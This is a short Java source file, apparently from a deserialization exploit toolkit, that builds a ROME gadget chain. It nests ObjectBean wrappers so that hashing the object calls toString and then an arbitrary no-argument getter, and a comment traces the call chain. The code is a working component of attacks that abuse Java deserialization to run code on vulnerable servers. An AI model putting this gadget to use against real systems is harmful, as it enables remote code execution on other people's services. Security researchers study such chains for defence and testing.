package xyz.eki.marshalexp.gadget.rome;


import com.rometools.rome.feed.impl.ObjectBean;

/**
 * Method.invoke(Object, Object...) -> getter None-Parameter
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 */
public class GRome {
    public static Object getRome2Getter(Class<?> clz,Object o){
//        ToStringBean tb = new ToStringBean(clz, o);
//        EqualsBean eb = new EqualsBean(ToStringBean.class, tb);
        ObjectBean tb = new ObjectBean(clz,o);
        ObjectBean eb = new ObjectBean(ObjectBean.class,tb);
        return eb;
    }
}
